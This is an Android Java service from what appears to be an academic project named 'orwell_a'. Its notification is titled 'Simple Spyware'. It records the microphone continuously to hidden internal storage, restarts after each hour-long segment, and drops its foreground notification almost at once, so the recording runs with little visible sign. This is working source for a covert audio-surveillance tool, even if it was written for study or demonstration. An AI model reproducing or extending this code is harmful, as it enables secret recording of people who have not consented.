package ch.zhaw.init.orwell_a.data.audio;


import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.util.Calendar;

import ch.zhaw.init.orwell_a.R;
import ch.zhaw.init.orwell_a.common.Utils;

import static android.Manifest.permission.RECORD_AUDIO;

public class MicrophoneService extends Service implements MediaRecorder.OnInfoListener{
    private static final String TAG = MicrophoneService.class.getCanonicalName();
    private MediaRecorder mediaRecorder;
    private String outPutFile;
    private static boolean isRecording;

    public static boolean isIsRecording() {
        return isRecording;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        startForegroundService();
        if(intent != null && intent.getAction() != null){
            if(intent.getAction().equals("StartAudioCapturing")){
                Log.i(TAG, "StartAudioCapturing " + Calendar.getInstance().getTime());
                if(checkPermission()){
                    startAudioCapturing();
                }else{
                    Log.e(TAG, "No Audio Permission");
                }
            }else if(intent.getAction().equals("StopAudioCapturing")){
                stopAudioCapturing(mediaRecorder);
            }
        }
        stopForeground(true);
        return START_STICKY;
    }

    /**
     * Create a Notification to start a foreground-service.
     */
    private void startForegroundService() {
        NotificationChannel channel = new NotificationChannel("1", "Microphone", NotificationManager.IMPORTANCE_LOW);
        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        if(notificationManager != null){
            notificationManager.createNotificationChannel(channel);
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "1")
                    .setSmallIcon(R.drawable.ic_remove_red_eye_black_24dp)
                    .setContentTitle("Simple Spyware")
                    .setContentText("Audio Record is running!")
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .setAutoCancel(true);
            Notification notification = builder.build();
            this.startForeground(1, notification);
        }
    }

    /**
     * Start capturing an audio file.
     */
    private void startAudioCapturing(){
        File internalStorage = getFilesDir();
        outPutFile = Utils.createFileName();
        outPutFile = internalStorage.getAbsolutePath()+"/"+outPutFile+".mp3";
        initMediaRecorder(outPutFile);
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            Log.i(TAG, "Started audio recording");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Stops the Audio recording and sends the file via broadcast.
     */
    private void stopAudioCapturing(MediaRecorder mr){
        if(mr != null){
            try{
                mr.stop();
                isRecording = false;
                Log.i(TAG, "Audio File Created: " + outPutFile);
            }catch (Exception e){
                Log.e(TAG, "Problems saving file!");
            }
        }
    }

    /**
     * Sets the initial configs for the microphone / audio settings.
     * @param outputFilePath file in which the audio capturing will be saved.
     */
    private void initMediaRecorder(String outputFilePath){
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setOutputFile(outputFilePath);
        mediaRecorder.setMaxDuration(1000 * 60 * 60); // Set a maximum duration for one file
    }

    private boolean checkPermission() {
        int result1 = ContextCompat.checkSelfPermission(getApplicationContext(), RECORD_AUDIO);
        return result1 == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public void onInfo(MediaRecorder mr, int what, int extra) {
        if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
            Log.i(TAG,"Maximum Audio Duration Reached");
            stopAudioCapturing(mr);
            startAudioCapturing();
        }
    }
}
